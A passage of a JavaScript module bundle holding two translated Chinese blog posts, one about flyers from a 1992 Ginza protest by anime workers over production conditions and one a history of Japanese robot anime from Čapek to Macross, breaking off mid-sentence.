var Mod15 = {"title":"【譯】我找到了當年由聲優 + 動畫師 + 動畫經營者進行抗議，要求改善現場制作條件的，幻之銀座動畫示威的傳單","slug":"ACG-ginza-demonstration","html":"<p>文章來源：<a target=\"_blank\" rel=\"nofollow\" href=\"https://anirepo.exblog.jp/15979776/\">https://anirepo.exblog.jp/15979776/</a></p>\n<hr>\n<p>在整理舊分會以前的資料時，我找到了幻之 1992 年的「<strong>要求改善電視動畫制作條件的 315 動畫示威運動</strong>」的傳單。</p>\n<p>我們這些參與動畫制作的人們，不論是否身為工會的成員，在這數十年來都不斷疾呼著要求改善電視動畫的制作條件、提高制作的單價。但最近知道這些歷史的人卻變得越來越少。或許也是因為大眾媒體不會提及這些勞工運動的歷史，國家（文科省和經濟產業省）的動畫制作產業的實況調查結果，以及大型企業的公司歷史裡也沒有這方面的資料。</p>\n<p>當時有些人因為制作行程和截止時間而沒能參加示威活動，但我記得這次「銀座示威」是頭一次由動畫聲優、動畫師、制作公司的經營者、工會成員、非工會成員，一同表示要求提高制作費、改善制作條件。</p>\n<p>電視動畫制作現場的勞動條件和行程，在當時和現在都是同樣的低單價和惡劣。</p>\n<p>銀座示威在 1991 年和 1992 年各進行了一次，這次找到的是第二次的時候的傳單。</p>\n<p><img src=\"https://pds.exblog.jp/pds/1/201102/27/39/c0024539_3254086.gif\" alt=\"pic 1\"></p>\n<p>（B5 尺寸單面單色印刷）※由動畫從業者協會 + 動畫共鬥會議（東映影片勞工工會、東京電影勞工工會、影像文化關聯產業勞工工會）+ 影演共鬥（電影演劇共鬥會議）發佈呼籲動畫業界人士參與示威活動的傳單。主要在制作現場、承包工作室散發。</p>\n<p>左上角有隻「繭章魚」舉著「提高預算」的標語牌。下方陳列著老手動畫師、演出家、聲優的名字。當時的動畫師是十分受到敬重的，在同意者的名單裡也能看到故人森康二的名字。</p>\n<p><img src=\"https://pds.exblog.jp/pds/1/201102/27/39/c0024539_14565882.gif\" alt=\"pic 2\"></p>\n<p>（B5 尺寸單面單色印刷）※由動畫從業者協會 + 動畫共鬥會議（東映影片勞工工會、東京電影勞工工會、影像文化關聯產業勞工工會）+ 影演共鬥（電影演劇共鬥會議）發佈給一般人的傳單。</p>\n<p>參加者也製作了各式各樣的標語牌，展示給路上的行人和車輛駕駛者，試圖傳達示威的意旨，也有一同反複高呼的口號。</p>\n<p>雖然聲優們已經相當熟悉如何發聲，對於首次參加的接案型動畫師們，要自白天長時間走在馬路上仍然是件辛苦的事。</p>\n<p>傳單上寫的「將 30 分鐘的節目的制作費提高到 1600 萬日圓以上」之後根據勞動法、勞動基準法、最低薪資法、物價上升重新計算，改成了「將 30 分鐘的節目的制作費提高到 2300 萬日圓以上」</p>\n<p><img src=\"https://pds.exblog.jp/pds/1/201102/27/39/c0024539_3235566.gif\" alt=\"pic 3\"></p>\n<p>（B5 尺寸雙面雙色印刷）這是由日本演員聯盟（共同工會、日本演員聯盟）所發佈的傳單。雖然上面沒有寫出日期時間，但裡面不只聲優，連同動畫師的事都一起寫了進去。</p>\n<p>「動畫師 因為不眠 不休 低預算…有 3 人過勞死」當時每年至少會有 1 位動畫師因為過勞而死亡。</p>\n<p>也有一段文章寫到「磯野波平 年收僅有 180 萬 無法養家活口」。</p>\n<p>↓ 背面。</p>\n<p><img src=\"https://pds.exblog.jp/pds/1/201102/27/39/c0024539_32466.gif\" alt=\"pic 4\"></p>\n","date":"2020-05-25T22:44:55.000Z","excerpt":"","printDate":"May 25, 2020","printReadingTime":"1 min read"};

var route_39 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod15
});

var Mod16 = {"title":"【譯】機器人動畫的歷史","slug":"ACG-history-of-robot-anime","html":"<p>文章來源： <a target=\"_blank\" rel=\"nofollow\" href=\"http://www.t3.rim.or.jp/~miukun/robot.htm\">http://www.t3.rim.or.jp/~miukun/robot.htm</a></p>\n<hr>\n<h2 id=\"機器人的誕生\">機器人的誕生</h2>\n<p>「機器人」(Robot) 的概念，其實仍然相當新穎。這個詞首次出現在 1920 年捷克斯洛伐克的偉大作家卡雷爾．恰佩克的舞台劇《R.U.R （羅梭的萬能工人）》裡。</p>\n<p>捷克自中世紀流傳至今的「魔像傳說」，對恰佩克造成了影響，使魔像（亦即「遵從拉比（猶太人的祭司）的魔法咒語所行動的泥人偶」）成為機器人的原型。「機器人」這個詞則是從捷克語的「賦職勞動」聯想而來。</p>\n<p>但在他的作品中登場的機器人，既不是機械造物也不是泥人偶。而是經過基因改造的人型生命體。以 1920 年的作品來說，可說是非常現代的點子。這也是部對於日新月異的科學發展敲響警鐘的名著。</p>\n<blockquote>\n<p>＜作品簡介＞</p>\n<p>主公司位於大西洋孤島上的跨國企業 ROSSAM，透過操縱基因成功地製造出廉價的人造人類。人們稱這種人造人為「Robot」，將其送至世界各地從事各種勞動服務。</p>\n<p>然而，理應是不持有感情的道具的 Robot 們，由於自己被用做世界戰爭裡的兵器而擁有了自我，並對人類挑起了反抗。</p>\n<p>人類在激烈的戰爭過後滅亡，唯一生存下來的技師老人成為 Robot 的俘虜，被強制進行延長 Robot 壽命的研究。Robot 在製造時便被設計為，會在經過數年的使用期間後停止機能，並且不持有生殖的習慣，因此時間一到會自動毀滅殆盡。地球上的知性生命體將完全死絕。</p>\n<p>研究走到瓶頸的技師，見到了全新的希望。那是兩位年輕男女 Robot 之間的熱戀。Robot 進化，並且成為了全新的人類。</p>\n</blockquote>\n<p>這部作品的反烏托邦意象影響了許多作家。例如德國的弗里茨·朗導演的《大都會》便很明顯是由恰佩克的意念所支配。</p>\n<p>之後，機器人的概念透過美國的 SF 作家以撒·艾西莫夫的作品走入大眾。艾希莫夫創造的機器人則是由機械組成，順從人類意識的勞動者。</p>\n<h2 id=\"機器人動畫的黎明期\">機器人動畫的黎明期</h2>\n<p>戰後日本的漫畫與漫畫，由手塚治虫開啟先河。</p>\n<p>手塚的世代受著恰佩克和艾西莫夫的影響成長，因此他的初期作品《鐵腕阿童木》和《融岩大使》，講述的是擁有人類意識的，機器人英雄的故事，也是理所當然。</p>\n<p>以及，手塚創立了「蟲製作公司」，盡心於日本的動畫發展。裡頭所製作的作品，必然地會是以他的作品，亦即機器人為主要內容。</p>\n<p>也就是說，日本的漫畫和動畫會如此重視機器人的原點，正是來自大元老．手塚治虫對於機器人的志向。</p>\n<p>手塚所鋪下的基礎，比我們所想像的，更加深刻地影響了我國的漫畫與動畫。例如日本的動畫相較歐美製作的作品，動作看來更為粗糙，彷彿像是紙戲一般。和同時期襲捲世界的迪士尼動畫（例如《白雪公主》）或是正統捷克的動畫（以伊里·特恩卡的作品最為著名）相比，便能看出這是鐵錚錚的事實。這是因為手塚的「蟲製作」的資金周轉問題。由於慢性的資金不足導致的持續性負債經營，沒有多餘的資金能用在賽璐珞畫上。只能做出像是紙戲般的粗糙動作動畫。</p>\n<p>「蟲製作」會陷入慢性貧困的原因，或許和手塚身為經營者的才能問題有關，但更多的原因是在當時的日本社會，整體上相較美國和捷克是貧窮的。沒有什麼人能將錢投入在動畫這種娛樂上。</p>\n<p>即使之後日本急遽地變得豐饒。日本的動畫家們仍然在模仿著手塚。這是因為日本社會偏向保守的，以傳承「大師」意志為重的傳統方針。這在文學、藝術和學術的領域裡也是同樣的。不過日本動畫的處境問題，還會牽扯到社會構造與經濟結構的問題，篇幅問題在此不做多談。</p>\n<p>宮崎駿和大友克洋的動畫，幸運地成為了這種環境下的例外。他們正巧做出了能夠賺錢的作品，攬到了許多贊助商成為夥伴。</p>\n<p>其它普遍的日本動畫仍是「紙戲」的存在。但也因此能以低成本製作許多作品，不必畏懼風險能夠挑戰各種冒險性的技法與故事構成。然而同時這也容易導致粗製濫造。日本的動畫是不斷在「跨時代性的冒險」與「粗製濫造」的雙面性之間來回擺盪著。</p>\n<p>這份事實是為了要理解後續的議論非常重要的前提，請先銘記在心。</p>\n<p>好，因為手塚治虫的機器人志向，日本人的起居間裡的映像管在非常早期就有了機器人四處飛翔的畫面。手塚治虫所刻畫的機器人，從後期《火之鳥》的洛比達也能看出，是非常帶有生物感、與人類同等層次的存在。</p>\n<p>漫畫家橫山光輝，將機器人轉變成為「戰鬥機器」。他所創作的《鐵人 28 號》，設定上是舊日本陸軍的秘密兵器。是藉由搖控器操作的兵器，不帶有感情的冰冷鐵塊，會由控制器使用者的意識而決定其善惡的存在。橫山光輝所刻畫的《鐵甲人》、《巴比倫 2 世》、《MARS》都有著一貫的意象，可說這就是他的機器人觀。</p>\n<p>因為《鐵腕阿童木》和《鐵人 28 號》的大受歡迎，日本機器人動畫的發展得到了保證。出現了許多優秀的後繼者。</p>\n<h2 id=\"永井豪與長濱忠夫\">永井豪與長濱忠夫</h2>\n<p>以天才般的感性大勢發展手塚和橫山的機器人觀的，正是永井豪。永井的兩大跨時代點子，讓機器人動畫迎來了全新的成長。</p>\n<p>第一是巨大化機器人，讓人類搭乘在上面。其值得記念的作品名正是《魔神 Z》。之後系譜往《大魔神》、《UFO 機器 葛蓮泰沙》發展。《葛蓮泰莎》據說至今仍在歐美的孩童之間擁有相當的人氣。</p>\n<p>第二是讓複數架戰鬥機合體成為機器人，也就是所謂的合體機人。其值得記念的作品名為《蓋特機器人》。這個路線日後往《蓋特機器人 G》、《鋼鐵吉克》發展。</p>\n<p>可說現今的日本機器人動畫是承襲永井豪路線而來也不為過。永井的功績是值得更高的評價的。</p>\n<p>但這些作品的故事觀看性仍嫌不足，大多數都不出相同的模式。也就是「來自異世界的入侵者，每週都會派出一架或數架的戰鬥機器人。正義的主角機器人前去迎擊打倒它們。並在最終回裡攻進敵方的基地打倒頭目」這一類的內容。不過當時的機器人動畫觀眾是年季尚輕的少年，這樣程度的故事其實也足夠了。</p>\n<p>若是僅有永井的基本點子，日本的機器人動畫將會失去眾人的興趣開始衰退。這時出現的中興英雄，便是長濱忠夫。他透過《超電磁機器人 孔巴德拉 V》、《超電磁機械 波羅五號》、《鬥將戴摩斯》，提出了所謂的「浪漫機器人」，不只有單純的機器人鬥毆，再加入了豐富的人際關係戲劇（人間ドラマ），以成為大人也能觀賞的作品為目的。</p>\n<p>例如超電磁系列的機器人需要由 5 架機器合體，所以會有 5 位主角。而這 5 人裡加入了小孩與女性，並強調各自的複雜個性。敵人的指揮官也存在知性並帶有人性的人物，整體的故事則是環繞於敵我之間的愛恨戲劇。例如《戴摩斯》裡敵人將領的妹妹和主角落入了戀愛關係。</p>\n<p>系列作中人氣最高的《超電磁機械 波羅五號》的故事構成更是複雜深刻。</p>\n<blockquote>\n<p>＜作品簡介＞</p>\n<p>在近代未來裡，波亞桑行星向地球發動了侵略戰爭，迎擊的合體機器人「波羅五號」實則是秘密逃亡至地球，擁有強烈正義感的波亞桑星人所建造的究極兵器。這位流亡菁英偽裝成地球人化名峰博士，和地球上的女性生下了三位孩子。這三位孩子正是本作的主角。</p>\n<p>然而峰博士與前妻生下的孩子，仍然還在波亞桑行星上。波亞桑星的指導者，要求身為逃亡者的兒子的海尼爾，擔起地球攻略尖兵的責任，而現身於主角面前。流有相同血脈的兄弟，互不知曉彼此的關係，為了各自祖國而戰的悲劇在此發生。</p>\n<p>隨著與波亞桑星球內的穩建派聯合，戰局走向對地球陣營有利的局面，最後邁向在波亞桑星球上的決戰。主角們在破壞了父親的故鄉，失去了親生兄長，深切的悲傷裡迎來了勝利…。</p>\n</blockquote>\n<p>人際關係的構成非常戲劇性的作品。</p>\n<p>他的作品至今仍然不顯遜色。在東南亞或歐洲的人氣動畫列表裡，必定會有長濱動畫的名字。他的功績亦同樣值得更高的評價。</p>\n<h2 id=\"機動戰士鋼彈\">機動戰士鋼彈</h2>\n<p>長浜的後繼者，正是富野喜幸（現名由悠季）。他可說是讓動畫在 80 年代成為大熱門的重點人物。《勇者萊丁》、《無敵鋼人 Zambot 3》、《無敵超人 Titan 3》便是忠實繼承長浜的浪漫機器人的作品。富野的風格在之後逐漸顯露出轉向現實主義路線的跡象。這時誕生的，就是名留歷史的名作《機動戰士鋼彈》。</p>\n<p>在 1979 年出現在映像管上的這部作品，是部捲起 80 年代動畫熱潮的問題作。即使在放映過後 20 年的現在仍享有穩固的人氣，從各方面來說都是十分令人驚異的機器人動畫。</p>\n<blockquote>\n<p>＜作品簡介＞</p>\n<p>在近現代未來裡，人類統整成名為地球聯邦的統一國家，將生活圈拓展至宇宙。在月球與地球之間的七處拉格朗日點上，建造了巨大圓筒狀的宇宙殖民地，將這些殖民地群稱為「Side」，並賦予他們自治權。</p>\n<p>宇宙世紀 0079 年，距離地球最遙遠的 Side 3，以吉翁公國的名號向地球聯邦政府發起獨立戰爭。吉翁軍以其新銳兵器 Mobile Suit（也就是機器人）採取的奇襲戰接連取得優勢，滅絕了地球半數的人類。</p>\n<p>處居劣勢的地球聯邦軍，在中立殖民地的 Side 7 裡，秘密地進行著機密兵器 Mobile Suit 「鋼彈」的開發。然而夏亞少佐所率領的特務部隊發動強襲，使得聯邦軍成員陷入瓦解狀態。正巧在現場的少年民眾阿姆羅．雷，無可奈何地搭上鋼彈，打倒了吉翁軍的 2 架 Mobile Suit（薩克）。之後，收容難民的新型宇宙航母「白色戰艦」，搭著阿姆羅與鋼彈展開返回地球的旅程。在由候補士官布萊德所領導，人材不足的白色戰艦裡，阿姆羅被任命為鋼彈的專屬駕駛員。</p>\n<p>一邊與執著地追趕來的吉翁軍戰鬥，一邊經歷了和母親的別離、友人的死別的阿姆羅，成長成為能夠獨當一面的戰士。</p>\n<p>成功奪回資源地帶奧德賽的聯邦軍，轉將主力部隊送往宇宙，開始了反擊戰。白色戰艦被指派為誘餌，執行佯攻作戰。在痛苦的戰鬥裡，阿姆羅覺醒成為了所謂「Newtype」的新人類（能夠汲取遠處他人的人心或意念的超能力者）。與勁敵夏亞展開捲入 Newtype 少女拉拉的宿命之戰，並親手打倒了拉拉。</p>\n<p>在最終決戰地點，阿巴瓦空的戰鬥裡。這場雙方都投入了總體戰力的戰鬥，由聯邦軍取得了勝利。阿姆羅戰勝了夏亞，鋼彈卻重度破損，在敵營中負傷隻身一人的他幾乎就要放棄的時候，他的耳裡傳來了伙伴為他引路的聲音。活著歸來的阿姆羅，投向了伙伴們的胸懷裡。</p>\n<p>宇宙世紀 0080 年，地球聯邦與吉翁共和國，簽定了終戰條約…。</p>\n</blockquote>\n<p>從劇情大綱也能看出，《鋼彈》的基本構造正是《星際大戰》與長浜浪漫機器人的混合體，並沒有太多的原創性。然而仍能帶起如此巨大浪潮的原因，正是在於將舊時的機器人動畫，轉換成 SF 戰爭劇的，富野的作家性。</p>\n<p>這個故事最重要的主題是「戰爭與人類」，並沒有投注過多的焦點在機器人本身，也就是說，即使劇中的兵器不是鋼彈或薩克這一類的機器人（例如置換成戰車或戰機），對於故事的發展也不會造成任何的障礙。例如說，鋼彈因為是試作機型而只有出現 1 架，但聯邦軍和吉翁軍都有所謂的「量產型」機器人不斷出現。擁有豐富資源的聯邦軍大量投入廉價品，缺乏資源的吉翁軍則是以少量的高性能機體為主，這樣的傾向差異也相當有趣。這可看作是參考了第二次世界大戰裡同盟國與軸心國的狀況。在『鋼彈』這部作品裡，機器人只是單純的兵器，故事的主角只是「被戰爭這異常事態所玩弄的人」。</p>\n<p>在中立地帶裡過著和平生活的阿姆羅與他的伙伴們，突然被捲進戰爭之中，對這毫不講理的狀況感到焦躁苦悶，卻只能為了活下去而戰鬥。他們並不相信戰爭中的大義，對於聯邦政府高官的能力抱持懷疑的態度。卻也沒有特別良好的團體伙伴關係，僅只是十分低落。而他們拚死命的奮鬥，也只是這名為戰爭的瘋狂裡其中一小部份的狀況。</p>\n<p>這和長濱動畫相比是種相當明顯不同的特徵。在長濱動畫的世界裡，主角們會樂意為了正義而戰鬥，也能藉由操縱機器人成為狀況的支配者。</p>\n<p>富野在發表了《鋼彈》後，刷新了既有的「重視戲劇的機器人動畫」，開創「有機器人登場的 SF 戰爭戲劇」。</p>\n<p>富野所刻劃的戰爭，是既昏暗又沉重的。會有為數眾多的深愛之人死去，結局也未必是能稱得上 Happy End 的發展。因為他並不是從單純的正義與邪惡的視點去談論戰爭。而是敵對的兩大勢力各自有著大義與深愛之人，處於對各自來說都是愚蠢恐怖而不幸的狀況之中。這便是富野所刻劃的戰爭的本質。經得起大人觀賞的這種作家性，成功引起了許多人的同感。</p>\n<p>這種路線之後分歧為許多形態，並成為刮起 80 年代動畫旋風的原動力。</p>\n<h2 id=\"太陽之牙-dougram\">太陽之牙 Dougram</h2>\n<p>在我的高中時代，一週有將近 40 部的動畫作品在電視上播放，大多數都是機器人動畫。</p>\n<p>我想介紹其中幾部我最為中意的作品，其一就是《太陽之牙 Dougram》</p>\n<p>於 1982 年播出的這部作品，是場以富野提出的真實機器人路線為軸的壯大實驗。也就是在機器人動畫裡，若是徹底追求真實性會使其成為什麼樣的作品，如此充滿冒險心的一部作品。當時是能夠堂堂地做出這種冒險的時代。</p>\n<p>導演是高橋良輔，他是位能夠代表這個時代的優秀作家。</p>\n<blockquote>\n<p>＜作品介紹＞</p>\n<p>在地球統整並樹立地球聯邦政府的近未來裡，人類苦惱於持續增加的人口，這時在宇宙空間裡發現了蟲洞。若是妥善利用就能達成短時間的外太空航行。穿過了蟲洞的探險隊發現了特羅迪亞行星。那是顆受到兩顆太陽照射的灼熱星球，但也擁有足夠讓人類生活的水與空氣。</p>\n<p>於是人類展開了移民，以低所得者為主的移民團，將特羅迪亞視為第二故鄉，在那裏留下了自己的生命與子孫。然而隨著地球上的資源見底，聯邦政府對於特羅迪亞的搾取開始加劇。</p>\n<p>於是特羅迪亞發動了反抗。由特羅迪亞人所組成的聯邦軍第 8 軍的指揮官馮．史坦因大佐，將走訪當地的地球聯邦評議會議長多南．卡西姆擄為人質，提出特羅迪亞獨立的要求。</p>\n<p>多南的兒子克林是地球的官校學生，知道父親困境的他自願參加特羅迪亞派遣部隊。成為戰鬥機器（也就是機器人）索爾迪克的駕駛員，經歷激戰後參與攻入監禁父親的首都卡迪納爾的作戰。首都的防備卻意外地輕薄，輕易地取回了人質。在官邸裡迎接攻入的克林一行人的是，與馮．史坦因握手的父親冰冷的視線。多南宣稱在與馮．史坦因談話過後，已經解決了問題。特羅迪亞將會升格成為地球聯邦的一州。</p>\n<p>其實這場人質事件只是場荒誕的戲劇，多南原本就打算藉由升格特羅迪亞解決居民們的不滿。但為了提高效果，找上了擁有強烈升官欲的馮．史坦因，演出了「這是由特羅迪亞人的努力所造就的政治成果」。</p>\n<p>地球聯邦的搾取隨後越發激烈，看穿這是謊言起身反抗的特羅迪亞人，遭到了殘忍的處罰和處刑。純真多感的克林看著數多的特羅迪亞友人感到心痛，試圖阻止父親的壓迫。多南卻冷淡地說道。「政治就是為了多數人捨棄少數人」。</p>\n<p>懊惱的克林，無法忍受在街上蠻橫的聯邦士兵，同樣試圖阻止卻險遭殺害。救了他的是在野的特羅迪亞人的科學家，實則是特羅迪亞游擊運動的地下指導者薩瑪林博士。這位溫厚的老博士溫柔地談道「政治是不斷努力為了讓少數的人獲得幸福」。克林對於博士的話語感到共鳴，決意要協助博士。</p>\n<p>看中克林純真的博士，即便知道克林身為多南的兒子，仍然推薦他成為新型戰鬥機器「達格拉姆」的駕駛員。然而克林的身後卻有父親的間諜在緊追著。掌控了達格拉姆秘密工廠的聯邦軍，押收達格拉姆，並捕捉了薩瑪林。克林因為身為多南的兒子當場得到釋放，卻被在旁觀察的游擊隊伙伴們認為是叛徒幾乎遭到殺害，只能拚命逃亡。</p>\n<p>歷經屈辱的克林，懷著滿胸對於父親的憤怒，潛入聯邦軍基地偷走達格拉姆。在離脫的途中與其它游擊隊的伙伴會合，解開誤會，重新成為游擊團體「太陽之牙」的一員，一同展開逃避行。</p>\n<p>以 10 字頭年輕人為主構成的「太陽之牙」，在苦於聯邦軍殘虐的傭兵部隊執拗的追擊下，終於抵達游擊隊據點的波納爾市，然而這裡已經遭到聯邦軍鎮壓，一行人只能繼續逃亡，他們在途中找到了薩瑪林博士的居所並成功救出，一同渡海將據點轉移至帕爾米納大陸。</p>\n<p>然而聯邦軍在新天地裡的力量依然強大，游擊隊們只能潛伏於山脈地帶裡靜待時機來臨。</p>\n<p>隨著聯邦政府的暴政更發嚴峻，特羅迪亞人的怒火已經不可克制，憤愾傳達到第 8 軍隊裡的特羅迪亞人士兵，演變成了大規模的軍隊叛亂。薩馬林博士與游擊隊和反叛軍會合，組成了「解放軍」，以帕爾米納的首都德加市為目標。在史達雷高原與連邦軍激戰，獲得了勝利。無血開城地進入德加，帕爾米納大陸成為了特羅迪亞人的國度。</p>\n<p>但是薩馬林所率領的解放軍的目的，是特羅迪亞星球的完全獨立。必須要攻陷地球上唯一的連絡港口北極港，克林一行人展開了怒濤的進擊。</p>\n<p>多南在這劇變的情勢下，因為心臟病發而倒下，聯邦軍的情勢開始潰堤。多南的秘書官拉寇克，打著藉此接管特羅迪亞的野心，和同樣懷有野心的馮．史坦因出現不和。馮．史坦因試圖以不增援第 8 軍（僅以特羅迪亞組成的的軍隊）的戰事逼迫拉寇克，但在知道拉寇克的真意，是想讓特羅迪亞人自相殘殺，由地球人收取漁翁之利時感到憤而激昂。想獨自一人與解放軍進行和平交涉的他，卻因為拉寇克設下的謀略遭到暗殺。聯邦轉變成了拉寇克的獨裁體制。</p>\n<p>隨著聯邦軍陷入混亂，解放軍連戰連勝，已經攻到北極港的面前。就在認為特羅迪亞的獨立只是時間問題的此時，他們突然收到了停止命令。原來是解放軍穩健派的卡爾梅爾，因為拉寇克的勸說而幽禁薩馬林，獨斷地簽署了停戰條約。</p>\n<p>拉寇克趁著這一瞬間的空隙，將在地球上待機的第 6 軍團移到了北極港。至此解放軍已經毫無勝算，拉寇克的態度轉向強硬，卡爾梅爾才驚覺受騙。</p>\n<p>特羅迪亞獲得了獨立。然而那只是名義上的獨立。搾取仍然存在，人們的臉上滿是愁雲。滿是憤怒的「太陽之牙」救出了被幽禁的薩馬林博士，再次展開逃亡。這次是理應是友軍的解放軍向他們展開攻擊。逃出戰場的薩馬林，以其身受重傷的一命停止了卡爾梅爾的攻勢，卻無法阻止拉寇克。這時奇跡發生了，遭到拉寇克羞辱的間諜德斯坦，因為激憤而射殺了拉寇克。</p>\n<p>克林一行人得救了，但克林並不打算將達格拉姆交給這偽善的政府。他決定親手摧毀達格拉姆。</p>\n<p>之後，年輕人們走向人生的新章。</p>\n</blockquote>\n<p>從劇情大綱也能看到，很難想像這種沈悶而高度的內容，會出現動畫作品的故事裡。當時究竟有多少人確切理解了整個故事的來龍去脈呢。然而走向的基本架構還是和《鋼彈》十分相似。或許是因為演出家和《鋼彈》是同樣的人（星山博之）吧。相異點只有主角站在的是反政府游擊軍一方的部份。</p>\n<p>但這部作品的主題，並不是「戰爭與人類」這種簡單 (?) 的東西。而是「政治」的本質。劇中的戰爭也僅是作為政治的裝飾物。</p>\n<p>因此主角克林和主角機器人達格拉姆，成了機器人動畫史上未見類例的卑微地位。克林僅是個血氣方剛的小鬼，達格拉姆是架無法影響狀況的兵器。</p>\n<p>這部作品真正的主角，是德南和薩馬林。主題在於究竟何者所提出的政治理念才是更為優秀的。克林與伙伴們僅是隨著這兩個政治家所提出的理念行動的渺小存在。因此故事後期的高峰成了西裝大叔們的角力，主角們的活躍變得非常薄弱。給人「什麼，原來你們還在的嗎？」的感覺。想必人人都會有過「這樣的故事不需要放進機器人動畫的框架裡吧？」的念頭。</p>\n<p>故事的結尾也是贊否兩論。所以游擊隊（解放軍）終究是失敗了嗎？答案是否定的。薩瑪林博士將歷史理解為毫不間斷的努力與細小的進步的累積。解放軍即使僅是形式上的，仍然爭取到了特羅迪亞的獨立。雖然是前進了三步，又後退了兩步。只有小小的一步，但前進便意味著勝利，這是這部作品的政治觀，也是主要的主題。</p>\n<p>那麼，「太陽之牙」這些年輕人們的奮鬥，究竟又算什麼呢。要不畏誤解地說的話，他們是配角。是被政治玩弄的庶民的代辯演者。他們的熱情令人想起 60 年代時的安保學生鬥爭。當時學生們的熱情在權力面前遭到擊潰。克林一行人的熱情也被無情的政治理論所擊潰。但這就是現實。克林一行人只有想著獨立，卻沒有想到任何具體的內容。任隨年少奔馳的年輕人魯莽的熱情，有時看來是如此美麗。乍看之下空虛的克林一行人的奮鬥，如此一想也是令人憐愛。</p>\n<p>《太陽之牙》是我最喜歡的機器人動畫。</p>\n<h2 id=\"超時空要塞-macross\">超時空要塞 Macross</h2>\n<p>在 1983 年播映的這部作品，是部能和《鋼彈》匹敵的人氣作品。故事的基本構造只是既有內容的混合成品，但裡頭許多極為現代的訊息，擊中了 80 年代年輕人們的心。</p>\n<p>前述提及的長浜忠夫、富野喜幸、高橋良輔都是全共鬥世代的人，雖然有著程度上的差別，他們都是在左翼人士的反政府活動中渡過青春的人們。因此他們的創作中，仍無法避免地帶有左翼路線的偏見。不論是《太陽之牙》的克林、《亞利安》的亞利安、《Z 鋼彈》的卡密兒，都是任隨自己的年輕而不經思索地行動，即便殺害了許多人也沒有擔起責任的人。但這些作家們（高橋、安彥、富野）卻稱讚並美化這樣的年輕人。這是因為他們對於 60 年代的過激派學生抱有同感。但 80 年代的年輕人則無法擁有相同的感受。雖然他們是擁有優秀能力的作家，但在這點上來說，他們是屬於舊世代的人。</p>\n<p>製作《Macross》的出淵裕、河森正治、美樹本晴彦，在當時還是 20 至 30 歲前後的年輕人。他們處於脫離全共鬥的咒縛，能夠站在現代的年輕人的觀點創作作品的立場。這是《Macross》最大的成功原因。</p>\n<blockquote>\n<p>＜作品介紹＞</p>\n<p>在近代未來裡，一顆巨大的隕石掉落在南太平洋的孤島阿塔利亞島上。調查過後，查明該隕石是由地球外生命體所建造的巨大宇宙船。然而不可思議的是，那是一艘完全無人的船。</p>\n<p>首次認識到外星人存在的地球人類，隨著組成地球聯邦政府後，組成了統合宇宙軍，將命名為「Macross」的外星宇宙船置於指揮旗下。</p>\n<p>之後過了 10 年，宇宙船 Macross 修復完成，準備展開首次航行。這時 Macross 自動對進入地球軌道的神秘宇宙船團展開了砲擊。Macross 其實是外星人的詭雷（陷阱）。</p>\n<p>監察軍和傑特拉帝軍已經在宇宙間持續了長達數世紀的星間戰爭。Macross 是監察軍放置於傑特拉帝進攻路線上的，地球的自動砲擊地雷。由於地球人渾然不知此一事態，將 Macross 改造成宇宙戰艦進為使用，而被捲進星間戰爭之中。</p>\n<p>被奇襲攻擊惹怒的傑特拉帝軍，馬上派遣了登陸部隊攻擊 Macross。Macross 雖然派出可變型戰鬥機女武神（變型成機器人）應戰，仍不敵於敵方的大量攻勢。苦惱的克羅巴爾艦長，決定使用未經完全測試的空間傳送裝置，逃至月球軌道上。卻因為裝置的暴走，而將 Macross 連同阿塔利亞島的市街傳送到了冥王星軌道上。</p>\n<p>束手無策的 Macross 試圖回到地球，但空間轉移裝置已經消失，只能採取通常航行的方式返回家園。阿塔利亞島的居民們移居至 Macross 艦內，在空置的區域建立城鎮，過起和之前相同的生活。徬徨在宇宙的這艘難民船，遇上了無止盡的傑特拉帝軍的攻擊。</p>\n<p>正巧到阿塔利亞島上遊玩的技藝駕駛員一條輝，接受了前輩佛卡少佐的勸說參軍戰鬥。他和市裡的偶像歌手林明美，與管制通訊員的早瀨美沙交心，走過與前輩和部下的死別，成為歷戰的勇士。</p>\n<p>傑特拉帝人是種擁有長達普通人類 5 倍長的身高的巨人族，毫無文化的純粹戰鬥種族。然而他們在與地球人的戰鬥和接觸裡知曉文化，為之動搖。在他們心中對於失落的文化的憧憬開始萌芽。</p>\n<p>千辛萬苦終於回到地球的 Macross，等著他們的卻是統合軍本部無情的應對。連邦政府害怕被捲進星間戰爭，決定捨棄 Macross 將其做為獻給敵人的祭品。</p>\n<p>被母星拋棄成為孤兒的 Macross，再次離開地球展開毫無目的的旅行。但對文化覺醒的傑特拉帝軍的布利泰司令，向 Macross 伸出了援手。試圖捨棄武器一同共存。</p>\n<p>然而傑特拉帝軍裡也有不同看法的人。布利泰的上司波多爾扎認定布利泰為背叛者，派出大型艦隊試圖抹殺地球與 Macross，地球在一瞬間便遭到滅亡，全人類被消滅殆盡。走投無路的 Macross 接受布利泰的建議，打出起死回生的策略。那就是透過通訊頻道讓明美的歌傳給敵方的全艦隊，趁著敵方生來首次接觸到文化的動搖空隙，擊破了波多爾扎的旗艦。</p>\n<p>Macross 和布利泰艦隊回到了化為廢墟的地球上，展開復興作業。在克服了內部分裂後終於迎來的希望。輝決定與明美別離，與美沙一同走向全新的未來。</p>\n</blockquote>\n<p>故事的走向，是《宇宙戰艦大和號》和《鋼彈》的混合體。被滿載外星科技的戰艦所玩弄的 Macross 船員們慌張的樣貌，是對《大和號》相當優秀的戲仿。以及女武神號流暢華麗的變型與迅速的戰姿，十分優秀地拓展了《鋼彈》的魅力。從《鋼彈》的續作（例如《Z 鋼彈》）裡也能看見受到《超時空要塞》影響的存在，便能理解這部作品的偉大之處。</p>\n<p>這部作品最大的原創點，就是描寫「文化」能夠成為消除戰爭的武器。這是個十分有趣的訊息。在《鋼彈》的世界裡，Newtype 常被用於除去戰爭的概念，但這和阿姆羅與夏亞這樣的 Newtype 投入在戰爭之中的姿態有著巨大的矛盾。在《超時空要塞》的世界裡，文化的代言人是偶像歌手的明美，她是位憎恨戰爭的無戰力人員，因此不會令人感到矛盾。雖然或許會有偶像的歌曲能否稱上文化的疑問，這就不深究了。</p>\n<p>以及應當注目的是，作品裡的巨大世界觀與樂天性。首先是將宇宙一分為二的星間戰爭設定。以及巨大戰艦 Macross 只是外星人所設下的單純的地雷，這種點子的規模之巨大。和毫無顧慮地將這地雷直接當成宇宙戰艦使用的悠哉態度，在漂流於宇宙的戰艦裡進行偶像甄選的輕鬆心態，在生死一瞬間的緊要關頭裡，煩惱於三角戀愛關係的主角的無憂無慮。這種樂天性正是直接擊中 80 